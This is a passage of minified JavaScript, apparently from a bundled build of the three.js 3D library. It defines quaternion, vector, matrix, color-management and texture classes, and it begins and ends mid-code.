this._x=e,this._y=n,this._z=i,this._w=s,this._onChangeCallback(),this}clone(){return new this.constructor(this._x,this._y,this._z,this._w)}copy(e){return this._x=e.x,this._y=e.y,this._z=e.z,this._w=e.w,this._onChangeCallback(),this}setFromEuler(e,n=!0){const i=e._x,s=e._y,r=e._z,a=e._order,o=Math.cos,l=Math.sin,c=o(i/2),h=o(s/2),d=o(r/2),p=l(i/2),f=l(s/2),y=l(r/2);switch(a){case"XYZ":this._x=p*h*d+c*f*y,this._y=c*f*d-p*h*y,this._z=c*h*y+p*f*d,this._w=c*h*d-p*f*y;break;case"YXZ":this._x=p*h*d+c*f*y,this._y=c*f*d-p*h*y,this._z=c*h*y-p*f*d,this._w=c*h*d+p*f*y;break;case"ZXY":this._x=p*h*d-c*f*y,this._y=c*f*d+p*h*y,this._z=c*h*y+p*f*d,this._w=c*h*d-p*f*y;break;case"ZYX":this._x=p*h*d-c*f*y,this._y=c*f*d+p*h*y,this._z=c*h*y-p*f*d,this._w=c*h*d+p*f*y;break;case"YZX":this._x=p*h*d+c*f*y,this._y=c*f*d+p*h*y,this._z=c*h*y-p*f*d,this._w=c*h*d-p*f*y;break;case"XZY":this._x=p*h*d-c*f*y,this._y=c*f*d-p*h*y,this._z=c*h*y+p*f*d,this._w=c*h*d+p*f*y;break;default:Ie("Quaternion: .setFromEuler() encountered an unknown order: "+a)}return n===!0&&this._onChangeCallback(),this}setFromAxisAngle(e,n){const i=n/2,s=Math.sin(i);return this._x=e.x*s,this._y=e.y*s,this._z=e.z*s,this._w=Math.cos(i),this._onChangeCallback(),this}setFromRotationMatrix(e){const n=e.elements,i=n[0],s=n[4],r=n[8],a=n[1],o=n[5],l=n[9],c=n[2],h=n[6],d=n[10],p=i+o+d;if(p>0){const f=.5/Math.sqrt(p+1);this._w=.25/f,this._x=(h-l)*f,this._y=(r-c)*f,this._z=(a-s)*f}else if(i>o&&i>d){const f=2*Math.sqrt(1+i-o-d);this._w=(h-l)/f,this._x=.25*f,this._y=(s+a)/f,this._z=(r+c)/f}else if(o>d){const f=2*Math.sqrt(1+o-i-d);this._w=(r-c)/f,this._x=(s+a)/f,this._y=.25*f,this._z=(l+h)/f}else{const f=2*Math.sqrt(1+d-i-o);this._w=(a-s)/f,this._x=(r+c)/f,this._y=(l+h)/f,this._z=.25*f}return this._onChangeCallback(),this}setFromUnitVectors(e,n){let i=e.dot(n)+1;return i<1e-8?(i=0,Math.abs(e.x)>Math.abs(e.z)?(this._x=-e.y,this._y=e.x,this._z=0,this._w=i):(this._x=0,this._y=-e.z,this._z=e.y,this._w=i)):(this._x=e.y*n.z-e.z*n.y,this._y=e.z*n.x-e.x*n.z,this._z=e.x*n.y-e.y*n.x,this._w=i),this.normalize()}angleTo(e){return 2*Math.acos(Math.abs(Ge(this.dot(e),-1,1)))}rotateTowards(e,n){const i=this.angleTo(e);if(i===0)return this;const s=Math.min(1,n/i);return this.slerp(e,s),this}identity(){return this.set(0,0,0,1)}invert(){return this.conjugate()}conjugate(){return this._x*=-1,this._y*=-1,this._z*=-1,this._onChangeCallback(),this}dot(e){return this._x*e._x+this._y*e._y+this._z*e._z+this._w*e._w}lengthSq(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w}length(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)}normalize(){let e=this.length();return e===0?(this._x=0,this._y=0,this._z=0,this._w=1):(e=1/e,this._x=this._x*e,this._y=this._y*e,this._z=this._z*e,this._w=this._w*e),this._onChangeCallback(),this}multiply(e){return this.multiplyQuaternions(this,e)}premultiply(e){return this.multiplyQuaternions(e,this)}multiplyQuaternions(e,n){const i=e._x,s=e._y,r=e._z,a=e._w,o=n._x,l=n._y,c=n._z,h=n._w;return this._x=i*h+a*o+s*c-r*l,this._y=s*h+a*l+r*o-i*c,this._z=r*h+a*c+i*l-s*o,this._w=a*h-i*o-s*l-r*c,this._onChangeCallback(),this}slerp(e,n){if(n<=0)return this;if(n>=1)return this.copy(e);let i=e._x,s=e._y,r=e._z,a=e._w,o=this.dot(e);o<0&&(i=-i,s=-s,r=-r,a=-a,o=-o);let l=1-n;if(o<.9995){const c=Math.acos(o),h=Math.sin(c);l=Math.sin(l*c)/h,n=Math.sin(n*c)/h,this._x=this._x*l+i*n,this._y=this._y*l+s*n,this._z=this._z*l+r*n,this._w=this._w*l+a*n,this._onChangeCallback()}else this._x=this._x*l+i*n,this._y=this._y*l+s*n,this._z=this._z*l+r*n,this._w=this._w*l+a*n,this.normalize();return this}slerpQuaternions(e,n,i){return this.copy(e).slerp(n,i)}random(){const e=2*Math.PI*Math.random(),n=2*Math.PI*Math.random(),i=Math.random(),s=Math.sqrt(1-i),r=Math.sqrt(i);return this.set(s*Math.sin(e),s*Math.cos(e),r*Math.sin(n),r*Math.cos(n))}equals(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._w===this._w}fromArray(e,n=0){return this._x=e[n],this._y=e[n+1],this._z=e[n+2],this._w=e[n+3],this._onChangeCallback(),this}toArray(e=[],n=0){return e[n]=this._x,e[n+1]=this._y,e[n+2]=this._z,e[n+3]=this._w,e}fromBufferAttribute(e,n){return this._x=e.getX(n),this._y=e.getY(n),this._z=e.getZ(n),this._w=e.getW(n),this._onChangeCallback(),this}toJSON(){return this.toArray()}_onChange(e){return this._onChangeCallback=e,this}_onChangeCallback(){}*[Symbol.iterator](){yield this._x,yield this._y,yield this._z,yield this._w}}class G{constructor(e=0,n=0,i=0){G.prototype.isVector3=!0,this.x=e,this.y=n,this.z=i}set(e,n,i){return i===void 0&&(i=this.z),this.x=e,this.y=n,this.z=i,this}setScalar(e){return this.x=e,this.y=e,this.z=e,this}setX(e){return this.x=e,this}setY(e){return this.y=e,this}setZ(e){return this.z=e,this}setComponent(e,n){switch(e){case 0:this.x=n;break;case 1:this.y=n;break;case 2:this.z=n;break;default:throw new Error("index is out of range: "+e)}return this}getComponent(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;default:throw new Error("index is out of range: "+e)}}clone(){return new this.constructor(this.x,this.y,this.z)}copy(e){return this.x=e.x,this.y=e.y,this.z=e.z,this}add(e){return this.x+=e.x,this.y+=e.y,this.z+=e.z,this}addScalar(e){return this.x+=e,this.y+=e,this.z+=e,this}addVectors(e,n){return this.x=e.x+n.x,this.y=e.y+n.y,this.z=e.z+n.z,this}addScaledVector(e,n){return this.x+=e.x*n,this.y+=e.y*n,this.z+=e.z*n,this}sub(e){return this.x-=e.x,this.y-=e.y,this.z-=e.z,this}subScalar(e){return this.x-=e,this.y-=e,this.z-=e,this}subVectors(e,n){return this.x=e.x-n.x,this.y=e.y-n.y,this.z=e.z-n.z,this}multiply(e){return this.x*=e.x,this.y*=e.y,this.z*=e.z,this}multiplyScalar(e){return this.x*=e,this.y*=e,this.z*=e,this}multiplyVectors(e,n){return this.x=e.x*n.x,this.y=e.y*n.y,this.z=e.z*n.z,this}applyEuler(e){return this.applyQuaternion(ym.setFromEuler(e))}applyAxisAngle(e,n){return this.applyQuaternion(ym.setFromAxisAngle(e,n))}applyMatrix3(e){const n=this.x,i=this.y,s=this.z,r=e.elements;return this.x=r[0]*n+r[3]*i+r[6]*s,this.y=r[1]*n+r[4]*i+r[7]*s,this.z=r[2]*n+r[5]*i+r[8]*s,this}applyNormalMatrix(e){return this.applyMatrix3(e).normalize()}applyMatrix4(e){const n=this.x,i=this.y,s=this.z,r=e.elements,a=1/(r[3]*n+r[7]*i+r[11]*s+r[15]);return this.x=(r[0]*n+r[4]*i+r[8]*s+r[12])*a,this.y=(r[1]*n+r[5]*i+r[9]*s+r[13])*a,this.z=(r[2]*n+r[6]*i+r[10]*s+r[14])*a,this}applyQuaternion(e){const n=this.x,i=this.y,s=this.z,r=e.x,a=e.y,o=e.z,l=e.w,c=2*(a*s-o*i),h=2*(o*n-r*s),d=2*(r*i-a*n);return this.x=n+l*c+a*d-o*h,this.y=i+l*h+o*c-r*d,this.z=s+l*d+r*h-a*c,this}project(e){return this.applyMatrix4(e.matrixWorldInverse).applyMatrix4(e.projectionMatrix)}unproject(e){return this.applyMatrix4(e.projectionMatrixInverse).applyMatrix4(e.matrixWorld)}transformDirection(e){const n=this.x,i=this.y,s=this.z,r=e.elements;return this.x=r[0]*n+r[4]*i+r[8]*s,this.y=r[1]*n+r[5]*i+r[9]*s,this.z=r[2]*n+r[6]*i+r[10]*s,this.normalize()}divide(e){return this.x/=e.x,this.y/=e.y,this.z/=e.z,this}divideScalar(e){return this.multiplyScalar(1/e)}min(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this.z=Math.min(this.z,e.z),this}max(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this.z=Math.max(this.z,e.z),this}clamp(e,n){return this.x=Ge(this.x,e.x,n.x),this.y=Ge(this.y,e.y,n.y),this.z=Ge(this.z,e.z,n.z),this}clampScalar(e,n){return this.x=Ge(this.x,e,n),this.y=Ge(this.y,e,n),this.z=Ge(this.z,e,n),this}clampLength(e,n){const i=this.length();return this.divideScalar(i||1).multiplyScalar(Ge(i,e,n))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this.z=Math.trunc(this.z),this}negate(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this}dot(e){return this.x*e.x+this.y*e.y+this.z*e.z}lengthSq(){return this.x*this.x+this.y*this.y+this.z*this.z}length(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)}normalize(){return this.divideScalar(this.length()||1)}setLength(e){return this.normalize().multiplyScalar(e)}lerp(e,n){return this.x+=(e.x-this.x)*n,this.y+=(e.y-this.y)*n,this.z+=(e.z-this.z)*n,this}lerpVectors(e,n,i){return this.x=e.x+(n.x-e.x)*i,this.y=e.y+(n.y-e.y)*i,this.z=e.z+(n.z-e.z)*i,this}cross(e){return this.crossVectors(this,e)}crossVectors(e,n){const i=e.x,s=e.y,r=e.z,a=n.x,o=n.y,l=n.z;return this.x=s*l-r*o,this.y=r*a-i*l,this.z=i*o-s*a,this}projectOnVector(e){const n=e.lengthSq();if(n===0)return this.set(0,0,0);const i=e.dot(this)/n;return this.copy(e).multiplyScalar(i)}projectOnPlane(e){return Kc.copy(this).projectOnVector(e),this.sub(Kc)}reflect(e){return this.sub(Kc.copy(e).multiplyScalar(2*this.dot(e)))}angleTo(e){const n=Math.sqrt(this.lengthSq()*e.lengthSq());if(n===0)return Math.PI/2;const i=this.dot(e)/n;return Math.acos(Ge(i,-1,1))}distanceTo(e){return Math.sqrt(this.distanceToSquared(e))}distanceToSquared(e){const n=this.x-e.x,i=this.y-e.y,s=this.z-e.z;return n*n+i*i+s*s}manhattanDistanceTo(e){return Math.abs(this.x-e.x)+Math.abs(this.y-e.y)+Math.abs(this.z-e.z)}setFromSpherical(e){return this.setFromSphericalCoords(e.radius,e.phi,e.theta)}setFromSphericalCoords(e,n,i){const s=Math.sin(n)*e;return this.x=s*Math.sin(i),this.y=Math.cos(n)*e,this.z=s*Math.cos(i),this}setFromCylindrical(e){return this.setFromCylindricalCoords(e.radius,e.theta,e.y)}setFromCylindricalCoords(e,n,i){return this.x=e*Math.sin(n),this.y=i,this.z=e*Math.cos(n),this}setFromMatrixPosition(e){const n=e.elements;return this.x=n[12],this.y=n[13],this.z=n[14],this}setFromMatrixScale(e){const n=this.setFromMatrixColumn(e,0).length(),i=this.setFromMatrixColumn(e,1).length(),s=this.setFromMatrixColumn(e,2).length();return this.x=n,this.y=i,this.z=s,this}setFromMatrixColumn(e,n){return this.fromArray(e.elements,n*4)}setFromMatrix3Column(e,n){return this.fromArray(e.elements,n*3)}setFromEuler(e){return this.x=e._x,this.y=e._y,this.z=e._z,this}setFromColor(e){return this.x=e.r,this.y=e.g,this.z=e.b,this}equals(e){return e.x===this.x&&e.y===this.y&&e.z===this.z}fromArray(e,n=0){return this.x=e[n],this.y=e[n+1],this.z=e[n+2],this}toArray(e=[],n=0){return e[n]=this.x,e[n+1]=this.y,e[n+2]=this.z,e}fromBufferAttribute(e,n){return this.x=e.getX(n),this.y=e.getY(n),this.z=e.getZ(n),this}random(){return this.x=Math.random(),this.y=Math.random(),this.z=Math.random(),this}randomDirection(){const e=Math.random()*Math.PI*2,n=Math.random()*2-1,i=Math.sqrt(1-n*n);return this.x=i*Math.cos(e),this.y=n,this.z=i*Math.sin(e),this}*[Symbol.iterator](){yield this.x,yield this.y,yield this.z}}const Kc=new G,ym=new so;class Ue{constructor(e,n,i,s,r,a,o,l,c){Ue.prototype.isMatrix3=!0,this.elements=[1,0,0,0,1,0,0,0,1],e!==void 0&&this.set(e,n,i,s,r,a,o,l,c)}set(e,n,i,s,r,a,o,l,c){const h=this.elements;return h[0]=e,h[1]=s,h[2]=o,h[3]=n,h[4]=r,h[5]=l,h[6]=i,h[7]=a,h[8]=c,this}identity(){return this.set(1,0,0,0,1,0,0,0,1),this}copy(e){const n=this.elements,i=e.elements;return n[0]=i[0],n[1]=i[1],n[2]=i[2],n[3]=i[3],n[4]=i[4],n[5]=i[5],n[6]=i[6],n[7]=i[7],n[8]=i[8],this}extractBasis(e,n,i){return e.setFromMatrix3Column(this,0),n.setFromMatrix3Column(this,1),i.setFromMatrix3Column(this,2),this}setFromMatrix4(e){const n=e.elements;return this.set(n[0],n[4],n[8],n[1],n[5],n[9],n[2],n[6],n[10]),this}multiply(e){return this.multiplyMatrices(this,e)}premultiply(e){return this.multiplyMatrices(e,this)}multiplyMatrices(e,n){const i=e.elements,s=n.elements,r=this.elements,a=i[0],o=i[3],l=i[6],c=i[1],h=i[4],d=i[7],p=i[2],f=i[5],y=i[8],_=s[0],g=s[3],u=s[6],v=s[1],x=s[4],S=s[7],E=s[2],A=s[5],C=s[8];return r[0]=a*_+o*v+l*E,r[3]=a*g+o*x+l*A,r[6]=a*u+o*S+l*C,r[1]=c*_+h*v+d*E,r[4]=c*g+h*x+d*A,r[7]=c*u+h*S+d*C,r[2]=p*_+f*v+y*E,r[5]=p*g+f*x+y*A,r[8]=p*u+f*S+y*C,this}multiplyScalar(e){const n=this.elements;return n[0]*=e,n[3]*=e,n[6]*=e,n[1]*=e,n[4]*=e,n[7]*=e,n[2]*=e,n[5]*=e,n[8]*=e,this}determinant(){const e=this.elements,n=e[0],i=e[1],s=e[2],r=e[3],a=e[4],o=e[5],l=e[6],c=e[7],h=e[8];return n*a*h-n*o*c-i*r*h+i*o*l+s*r*c-s*a*l}invert(){const e=this.elements,n=e[0],i=e[1],s=e[2],r=e[3],a=e[4],o=e[5],l=e[6],c=e[7],h=e[8],d=h*a-o*c,p=o*l-h*r,f=c*r-a*l,y=n*d+i*p+s*f;if(y===0)return this.set(0,0,0,0,0,0,0,0,0);const _=1/y;return e[0]=d*_,e[1]=(s*c-h*i)*_,e[2]=(o*i-s*a)*_,e[3]=p*_,e[4]=(h*n-s*l)*_,e[5]=(s*r-o*n)*_,e[6]=f*_,e[7]=(i*l-c*n)*_,e[8]=(a*n-i*r)*_,this}transpose(){let e;const n=this.elements;return e=n[1],n[1]=n[3],n[3]=e,e=n[2],n[2]=n[6],n[6]=e,e=n[5],n[5]=n[7],n[7]=e,this}getNormalMatrix(e){return this.setFromMatrix4(e).invert().transpose()}transposeIntoArray(e){const n=this.elements;return e[0]=n[0],e[1]=n[3],e[2]=n[6],e[3]=n[1],e[4]=n[4],e[5]=n[7],e[6]=n[2],e[7]=n[5],e[8]=n[8],this}setUvTransform(e,n,i,s,r,a,o){const l=Math.cos(r),c=Math.sin(r);return this.set(i*l,i*c,-i*(l*a+c*o)+a+e,-s*c,s*l,-s*(-c*a+l*o)+o+n,0,0,1),this}scale(e,n){return this.premultiply(Zc.makeScale(e,n)),this}rotate(e){return this.premultiply(Zc.makeRotation(-e)),this}translate(e,n){return this.premultiply(Zc.makeTranslation(e,n)),this}makeTranslation(e,n){return e.isVector2?this.set(1,0,e.x,0,1,e.y,0,0,1):this.set(1,0,e,0,1,n,0,0,1),this}makeRotation(e){const n=Math.cos(e),i=Math.sin(e);return this.set(n,-i,0,i,n,0,0,0,1),this}makeScale(e,n){return this.set(e,0,0,0,n,0,0,0,1),this}equals(e){const n=this.elements,i=e.elements;for(let s=0;s<9;s++)if(n[s]!==i[s])return!1;return!0}fromArray(e,n=0){for(let i=0;i<9;i++)this.elements[i]=e[i+n];return this}toArray(e=[],n=0){const i=this.elements;return e[n]=i[0],e[n+1]=i[1],e[n+2]=i[2],e[n+3]=i[3],e[n+4]=i[4],e[n+5]=i[5],e[n+6]=i[6],e[n+7]=i[7],e[n+8]=i[8],e}clone(){return new this.constructor().fromArray(this.elements)}}const Zc=new Ue,xm=new Ue().set(.4123908,.3575843,.1804808,.212639,.7151687,.0721923,.0193308,.1191948,.9505322),_m=new Ue().set(3.2409699,-1.5373832,-.4986108,-.9692436,1.8759675,.0415551,.0556301,-.203977,1.0569715);function Hw(){const t={enabled:!0,workingColorSpace:Fr,spaces:{},convert:function(s,r,a){return this.enabled===!1||r===a||!r||!a||(this.spaces[r].transfer===it&&(s.r=Ri(s.r),s.g=Ri(s.g),s.b=Ri(s.b)),this.spaces[r].primaries!==this.spaces[a].primaries&&(s.applyMatrix3(this.spaces[r].toXYZ),s.applyMatrix3(this.spaces[a].fromXYZ)),this.spaces[a].transfer===it&&(s.r=Ar(s.r),s.g=Ar(s.g),s.b=Ar(s.b))),s},workingToColorSpace:function(s,r){return this.convert(s,this.workingColorSpace,r)},colorSpaceToWorking:function(s,r){return this.convert(s,r,this.workingColorSpace)},getPrimaries:function(s){return this.spaces[s].primaries},getTransfer:function(s){return s===$i?Bl:this.spaces[s].transfer},getToneMappingMode:function(s){return this.spaces[s].outputColorSpaceConfig.toneMappingMode||"standard"},getLuminanceCoefficients:function(s,r=this.workingColorSpace){return s.fromArray(this.spaces[r].luminanceCoefficients)},define:function(s){Object.assign(this.spaces,s)},_getMatrix:function(s,r,a){return s.copy(this.spaces[r].toXYZ).multiply(this.spaces[a].fromXYZ)},_getDrawingBufferColorSpace:function(s){return this.spaces[s].outputColorSpaceConfig.drawingBufferColorSpace},_getUnpackColorSpace:function(s=this.workingColorSpace){return this.spaces[s].workingColorSpaceConfig.unpackColorSpace},fromWorkingColorSpace:function(s,r){return Ya("ColorManagement: .fromWorkingColorSpace() has been renamed to .workingToColorSpace()."),t.workingToColorSpace(s,r)},toWorkingColorSpace:function(s,r){return Ya("ColorManagement: .toWorkingColorSpace() has been renamed to .colorSpaceToWorking()."),t.colorSpaceToWorking(s,r)}},e=[.64,.33,.3,.6,.15,.06],n=[.2126,.7152,.0722],i=[.3127,.329];return t.define({[Fr]:{primaries:e,whitePoint:i,transfer:Bl,toXYZ:xm,fromXYZ:_m,luminanceCoefficients:n,workingColorSpaceConfig:{unpackColorSpace:Rn},outputColorSpaceConfig:{drawingBufferColorSpace:Rn}},[Rn]:{primaries:e,whitePoint:i,transfer:it,toXYZ:xm,fromXYZ:_m,luminanceCoefficients:n,outputColorSpaceConfig:{drawingBufferColorSpace:Rn}}}),t}const je=Hw();function Ri(t){return t<.04045?t*.0773993808:Math.pow(t*.9478672986+.0521327014,2.4)}function Ar(t){return t<.0031308?t*12.92:1.055*Math.pow(t,.41666)-.055}let Ys;class Gw{static getDataURL(e,n="image/png"){if(/^data:/i.test(e.src)||typeof HTMLCanvasElement>"u")return e.src;let i;if(e instanceof HTMLCanvasElement)i=e;else{Ys===void 0&&(Ys=Vl("canvas")),Ys.width=e.width,Ys.height=e.height;const s=Ys.getContext("2d");e instanceof ImageData?s.putImageData(e,0,0):s.drawImage(e,0,0,e.width,e.height),i=Ys}return i.toDataURL(n)}static sRGBToLinear(e){if(typeof HTMLImageElement<"u"&&e instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&e instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&e instanceof ImageBitmap){const n=Vl("canvas");n.width=e.width,n.height=e.height;const i=n.getContext("2d");i.drawImage(e,0,0,e.width,e.height);const s=i.getImageData(0,0,e.width,e.height),r=s.data;for(let a=0;a<r.length;a++)r[a]=Ri(r[a]/255)*255;return i.putImageData(s,0,0),n}else if(e.data){const n=e.data.slice(0);for(let i=0;i<n.length;i++)n instanceof Uint8Array||n instanceof Uint8ClampedArray?n[i]=Math.floor(Ri(n[i]/255)*255):n[i]=Ri(n[i]);return{data:n,width:e.width,height:e.height}}else return Ie("ImageUtils.sRGBToLinear(): Unsupported image type. No color space conversion applied."),e}}let Ww=0;class bp{constructor(e=null){this.isSource=!0,Object.defineProperty(this,"id",{value:Ww++}),this.uuid=io(),this.data=e,this.dataReady=!0,this.version=0}getSize(e){const n=this.data;return typeof HTMLVideoElement<"u"&&n instanceof HTMLVideoElement?e.set(n.videoWidth,n.videoHeight,0):typeof VideoFrame<"u"&&n instanceof VideoFrame?e.set(n.displayHeight,n.displayWidth,0):n!==null?e.set(n.width,n.height,n.depth||0):e.set(0,0,0),e}set needsUpdate(e){e===!0&&this.version++}toJSON(e){const n=e===void 0||typeof e=="string";if(!n&&e.images[this.uuid]!==void 0)return e.images[this.uuid];const i={uuid:this.uuid,url:""},s=this.data;if(s!==null){let r;if(Array.isArray(s)){r=[];for(let a=0,o=s.length;a<o;a++)s[a].isDataTexture?r.push(Jc(s[a].image)):r.push(Jc(s[a]))}else r=Jc(s);i.url=r}return n||(e.images[this.uuid]=i),i}}function Jc(t){return typeof HTMLImageElement<"u"&&t instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&t instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&t instanceof ImageBitmap?Gw.getDataURL(t):t.data?{data:Array.from(t.data),width:t.width,height:t.height,type:t.data.constructor.name}:(Ie("Texture: Unable to serialize Texture."),{})}let jw=0;const Qc=new G;class Yt extends Wr{constructor(e=Yt.DEFAULT_IMAGE,n=Yt.DEFAULT_MAPPING,i=Ti,s=Ti,r=qt,a=Ps,o=qn,l=_n,c=Yt.DEFAULT_ANISOTROPY,h=$i){super(),this.isTexture=!0,Object.defineProperty(this,"id",{value:jw++}),this.uuid=io(),this.name="",this.source=new bp(e),this.mipmaps=[],this.mapping=n,this.channel=0,this.wrapS=i,this.wrapT=s,this.magFilter=r,this.minFilter=a,this.anisotropy=c,this.format=o,this.internalFormat=null,this.type=l,this.offset=new Je(0,0),this.repeat=new Je(1,1),this.center=new Je(0,0),this.rotation=0,this.matrixAutoUpdate=!0,this.matrix=new Ue,this.generateMipmaps=!0,this.premultiplyAlpha=!1,this.flipY=!0,this.unpackAlignment=4,this.colorSpace=h,this.userData={},this.updateRanges=[],this.version=0,this.onUpdate=null,this.renderTarget=null,this.isRenderTargetTexture=!1,this.isArrayTexture=!!(e&&e.depth&&e.depth>1),this.pmremVersion=0}get width(){return this.source.getSize(Qc).x}get height(){return this.source.getSize(Qc).y}get depth(){return this.source.getSize(Qc).z}get image(){return this.source.data}set image(e=null){this.source.data=e}updateMatrix(){this.matrix.setUvTransform(this.offset.x,this.offset.y,this.repeat.x,this.repeat.y,this.rotation,this.center.x,this.center.y)}addUpdateRange(e,n){this.updateRanges.push({start:e,count:n})}clearUpdateRanges(){this.updateRanges.length=0}clone(){return new this.constructor().copy(this)}copy(e){return this.name=e.name,this.source=e.source,this.mipmaps=e.mipmaps.slice(0),this.mapping=e.mapping,this.channel=e.channel,this.wrapS=e.wrapS,this.wrapT=e.wrapT,this.magFilter=e.magFilter,this.minFilter=e.minFilter,this.anisotropy=e.anisotropy,this.format=e.format,this.internalFormat=e.internalFormat,this.type=e.type,this.offset.copy(e.offset),this.repeat.copy(e.repeat),this.center.copy(e.center),this.rotation=e.rotation,this.matrixAutoUpdate=e.matrixAutoUpdate,this.matrix.copy(e.matrix),this.generateMipmaps=e.generateMipmaps,this.premultiplyAlpha=e.premultiplyAlpha,this.flipY=e.flipY,this.unpackAlignment=e.unpackAlignment,this.colorSpace=e.colorSpace,this.renderTarget=e.renderTarget,this.isRenderTargetTexture=e.isRenderTargetTexture,this.isArrayTexture=e.isArrayTexture,this.userData=JSON.parse(JSON.stringify(e.userData)),this.needsUpdate=!0,this}setValues(e){for(const n in e){const i=e[n];if(i===void 0){Ie(`Texture.setValues(): parameter '${n}' has value of undefined.`);continue}const s=this[n];if(s===void 0){Ie(`Texture.setValues(): property '${n}' does not exist.`);continue}s&&i&&s.isVector2&&i.isVector2||s&&i&&s.isVector3&&i.isVector3||s&&i&&s.isMatrix3&&i.isMatrix3?s.copy(i):this[n]=i}}toJSON(e){const n=e===void 0||typeof e=="string";if(!n&&e.textures[this.uuid]!==void 0)return e.textures[this.uuid];const i={metadata:{version:4.7,type:"Texture",generator:"Texture.toJSON"},uuid:this.uuid,name:this.name,image:this.source.toJSON(e).uuid,mapping:this.mapping,channel:this.channel,repeat:[this.repeat.x,this.repeat.y],offset:[this.offset.x,this.offset.y],center:[this.center.x,this.center.y],rotation:this.rotation,wrap:[this.wrapS,this.wrapT],format:this.format,internalFormat:this.internalFormat,type:this.type,colorSpace:this.colorSpace,minFilter:this.minFilter,magFilter:this.magFilter,anisotropy:this.anisotropy,flipY:this.flipY,generateMipmaps:this.generateMipmaps,premultiplyAlpha:this.premultiplyAlpha,unpackAlignment:this.unpackAlignment};return Object.keys(this.userData).length>0&&(i.userData=this.userData),n||(e.textures[this.uuid]=i),i}dispose(){this.dispatchEvent({type:"dispose"})}transformUv(e){if(this.mapping!==Y0)return e;if(e.applyMatrix3(this.matrix),e.x<0||e.x>1)switch(this.wrapS){case ja:e.x=e.x-Math.floor(e.x);break;case Ti:e.x=e.x<0?0:1;break;case Nd:Math.abs(Math.floor(e.x)%2)===1?e.x=Math.ceil(e.x)-e.x:e.x=e.x-Math.floor(e.x);break}if(e.y<0||e.y>1)switch(this.wrapT){case ja:e.y=e.y-Math.floor(e.y);break;case Ti:e.y=e.y<0?0:1;break;case Nd:Math.abs(Math.floor(e.y)%2)===1?e.y=Math.ceil(e.y)-e.y:e.y=e.y-Math.floor(e.y);break}return this.flipY&&(e.y=1-e.y),e}set needsUpdate(e){e===!0&&(this.version++,this.source.needsUpdate=!0)}set needsPMREMUpdate(e){e===!0&&this.pmremVersion++}}Yt.DEFAULT_IMAGE=null;Yt.DEFAULT_MAPPING=Y0;Yt.DEFAULT_ANISOTROPY=1;class bt{constructor(e=0,n=0,i=0,s=1){bt.prototype.isVector4=!0,this.x=e,this.y=n,this.z=i,this.w=s}get width(){return this.z}set width(e){this.z=e}get height(){return this.w}set height(e){this.w=e}set(e,n,i,s){return this.x=e,this.y=n,this.z=i,this.w=s,this}setScalar(e){return this.x=e,this.y=e,this.z=e,this.w=e,this}setX(e){return this.x=e,this}setY(e){return this.y=e,this}setZ(e){return this.z=e,this}setW(e){return this.w=e,this}setComponent(e,n){switch(e){case 0:this.x=n;break;case 1:this.y=n;break;case 2:this.z=n;break;case 3:this.w=n;break;default:throw new Error("index is out of range: "+e)}return this}getComponent(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw new Error("index is out of range: "+e)}}clone(){return new this.constructor(this.x,this.y,this.z,this.w)}copy(e){return this.x=e.x,this.y=e.y,this.z=e.z,this.w=e.w!==void 0?e.w:1,this}add(e){return this.x+=e.x,this.y+=e.y,this.z+=e.z,this.w+=e.w,this}addScalar(e){return this.x+=e,this.y+=e,this.z+=e,this.w+=e,this}addVectors(e,n){return this.x=e.x+n.x,this.y=e.y+n.y,this.z=e.z+n.z,this.w=e.w+n.w,this}addScaledVector(e,n){return this.x+=e.x*n,this.y+=e.y*n,this.z+=e.z*n,this.w+=e.w*n,this}sub(e){return this.x-=e.x,this.y-=e.y,this.z-=e.z,this.w-=e.w,this}subScalar(e){return this.x-=e,this.y-=e,this.z-=e,this.w-=e,this}subVectors(e,n){return this.x=e.x-n.x,this.y=e.y-n.y,this.z=e.z-n.z,this.w=e.w-n.w,this}multiply(e){return this.x*=e.x,this.y*=e.y,this.z*=e.z,this.w*=e.w,this}multiplyScalar(e){return this.x*=e,this.y*=e,this.z*=e,this.w*=e,this}applyMatrix4(e){const n=this.x,i=this.y,s=this.z,r=this.w,a=e.elements;return this.x=a[0]*n+a[4]*i+a[8]*s+a[12]*r,this.y=a[1]*n+a[5]*i+a[9]*s+a[13]*r,this.z=a[2]*n+a[6]*i+a[10]*s+a[14]*r,this.w=a[3]*n+a[7]*i+a[11]*s+a[15]*r,this}divide(e){return this.x/=e.x,this.y/=e.y,this.z/=e.z,this.w/=e.w,this}divideScalar(e){return this.multiplyScalar(1/e)}setAxisAngleFromQuaternion(e){this.w=2*Math.acos(e.w);const n=Math.sqrt(1-e.w*e.w);return n<1e-4?(this.x=1,this.y=0,this.z=0):(this.x=e.x/n,this.y=e.y/n,this.z=e.z/n),this}setAxisAngleFromRotationMatrix(e){let n,i,s,r;const l=e.elements,c=l[0],h=l[4],d=l[8],p=l[1],f=l[5],y=l[9],_=l[2],g=l[6],u=l[10];if(Math.abs(h-p)<.01&&Math.abs(d-_)<.01&&Math.abs(y-g)<.01){if(Math.abs(h+p)<.1&&Math.abs(d+_)<.1&&Math.abs(y+g)<.1&&Math.abs(c+f+u-3)<.1)return this.set(1,0,0,0),this;n=Math.PI;const x=(c+1)/2,S=(f+1)/2,E=(u+1)/2,A=(h+p)/4,C=(d+_)/4,L=(y+g)/4;return 